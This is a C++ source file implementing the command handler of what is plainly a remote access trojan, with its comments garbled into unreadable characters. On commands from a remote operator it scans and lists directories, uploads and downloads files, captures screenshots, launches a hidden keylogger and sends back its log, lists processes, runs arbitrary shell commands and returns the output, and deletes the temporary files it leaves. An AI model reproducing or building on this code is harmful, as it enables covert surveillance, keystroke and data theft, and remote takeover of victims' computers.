#include "Config.h"
#include "Global.h"
#include "Controller.h"

using namespace std;

Controller::Controller()
{
	initializeError = false;
	working = true;
	if (ns.initializeError)
	{
		initializeError = true;
	}
	if (WORKMODE == 1)	// �������ӣ�ns�������
	{
		if (!ns.WaitConnect())
		{
			initializeError = true;
		}
		// else init_success
	}
	else if (WORKMODE == 2)	// �������ӣ�ns��������
	{
		if (!ns.Connect2Client())
		{
			initializeError = true;
		}
		cout << "Connect" << endl;
	}
}

bool Controller::RecvCmd()
{
	if (!ns.ReceiveData())
	{
		return false;
	}
	// cout << recvBuffer << endl;
	return true;
}

bool Controller::ExecCmd()
{
	bool retValue = true;
	if (!strcmp(recvBuffer, "hello"))
	{
		// NOP, retValue = true;
	}
	else if (!strcmp(recvBuffer, "scan"))
	{
		retValue = RecvCmd();
		if (retValue)	// �ɹ�����ɨ��·��
		{
			retValue = fm.FileScan(recvBuffer);
			if (retValue)	// �ɹ�ɨ��
			{
				/*char sendBuffer[SIZE];
				memset(sendBuffer, 0, sizeof(sendBuffer));*/
				ofstream tmpFile;
				char tmpFilePath[40];
				strcpy(tmpFilePath, "G:\\skjdkhfkqu87823ehksdzsaldk.txt");
				tmpFile.open(tmpFilePath);
				if (!tmpFile)
				{
					retValue = false;
				}
				for (vector<string>::iterator iter = directoryScanResult.begin(); iter != directoryScanResult.end(); ++iter)
				{
					tmpFile.write(((*iter) + " [directory] \n").c_str(), ((*iter) + " [directory] \n").length());
				}
				for (vector<string>::iterator iter = fileScanResult.begin(); iter != fileScanResult.end(); ++iter)
				{
					tmpFile.write(((*iter) + " [file] \n").c_str(), ((*iter) + " [file] \n").length());
				}
				tmpFile.close();	// �ȹر��ļ��ٷ���
				retValue = ns.SendFile(tmpFilePath);		// ���ͽ����Ϊִ�н��
				fm.FileDelete(tmpFilePath);
			}
		}
	}
	else if (!strcmp(recvBuffer, "upload"))
	{
		retValue = RecvCmd();
		if (retValue)
		{
			char filePath[666];
			strcpy(filePath, recvBuffer);
			retValue = ns.ReceiveFile(filePath);
		}
	}
	else if (!strcmp(recvBuffer, "download"))
	{
		retValue = RecvCmd();
		if (retValue)
		{
			char filePath[666];
			strcpy(filePath, recvBuffer);
			retValue = ns.SendFile(filePath);
		}
	}
	else if (!strcmp(recvBuffer, "screen"))     //��Ļ����
	{
		retValue = sc.Shot();
		sc.MakeZip();
		char tmpFilePath[40];
		strcpy(tmpFilePath, "G:\\test.zip");
		retValue = ns.SendFile(tmpFilePath);
		fm.FileDelete(tmpFilePath);
	}
	else if (!strcmp(recvBuffer, "monitor_on"))            //�յ��������̼���ָ��
	{
		WinExec("keyboard.exe", SW_HIDE);      // ����keyboard����
	}
	else if (!strcmp(recvBuffer, "monitor_off"))
	{
		system("TASKKILL /F /IM keyboard.exe");    //�ر�keyboard����
		char filePath[40];
		strcpy(filePath, "F:\\keylog.txt");           //����keylog�ļ�
		retValue = ns.SendFile(filePath);
		fm.FileDelete(filePath);

	}
	else if (!strcmp(recvBuffer, "process"))               //����ɨ�����
	{
		system("EnumProcess_Test.exe");
		char filePath[40];
		strcpy(filePath, "F:\\log.txt");
		retValue = ns.SendFile(filePath);
	}
	else if (!strcmp(recvBuffer, "quit"))
	{
		retValue = ns.Clear();
		working = false;
	}
	else if (!strcmp(recvBuffer, "shell"))
	{
		string strRet;
		retValue = ns.ReceiveData();
		if (retValue)	// �ɹ�����ָ��
		{
			strRet = sh.eval(recvBuffer);
			if (strRet.length())
			{
				cout << strRet << endl;
				retValue = ns.SendData(strRet.c_str(), strRet.length());
			}
			else
			{
				retValue = ns.SendData("No result.", 11);
			}
		}
	}
	else
	{
		// NOP
	}

	return retValue;
}

void Controller::Close()
{
	ns.Clear();
}
